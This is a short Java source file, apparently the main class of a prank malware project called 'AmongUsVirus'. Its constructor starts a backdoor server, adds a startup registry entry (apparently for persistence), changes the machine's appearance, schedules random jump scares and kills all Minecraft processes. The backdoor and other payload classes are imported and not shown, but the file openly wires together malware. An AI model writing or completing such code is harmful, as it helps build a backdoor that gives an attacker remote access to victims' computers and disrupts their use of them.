package com.github.pulsebeat02;

import com.github.pulsebeat02.appearance.AppearanceChanger;
import com.github.pulsebeat02.backdoor.BackDoorServer;
import com.github.pulsebeat02.backdoor.ServerStartup;
import com.github.pulsebeat02.jumpscare.RandomJumpScare;
import com.github.pulsebeat02.utility.TaskUtilities;

import java.net.URISyntaxException;

public class AmongUsVirus {

  private final BackDoorServer server;
  private final ServerStartup startup;
  private final AppearanceChanger changer;
  private final RandomJumpScare jumpScare;

  public AmongUsVirus() {
    jumpScare = new RandomJumpScare();
    server = new BackDoorServer();
    startup = new ServerStartup();
    startup.addRegistry();
    changer = new AppearanceChanger();
    killMinecraftTasks();
  }

  public static void main(final String[] args) {
    // new RandomJumpScare();
    new AppearanceChanger();
  }

  public void killMinecraftTasks() {
    TaskUtilities.killAllTasks("Minecraft");
  }
}
